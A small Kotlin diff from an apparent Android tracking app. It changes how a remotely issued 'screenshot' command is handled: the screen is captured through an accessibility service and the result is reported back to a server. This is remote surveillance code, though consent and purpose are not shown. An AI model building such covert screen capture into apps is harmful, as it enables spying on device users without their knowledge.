@@ -167,10 +167,15 @@ class TrackerService : Service() {
             }
             "screenshot" -> {
                 Log.d(TAG, "Taking screenshot via AccessibilityService")
-                TrackerAccessibilityService.captureScreenshot { success ->
+                TrackerAccessibilityService.captureScreenshot(commandId) { success ->
                     Log.d(TAG, "Screenshot result: $success")
                     try {
-                        ApiClient.updateCommandStatus(commandId, if (success) "completed" else "failed")
+                        ApiClient.updateCommandStatus(
+                            commandId,
+                            if (success) "completed" else "failed",
+                            null,
+                            if (success) "image" else null
+                        )
                     } catch (e: Exception) {}
                 }
             }
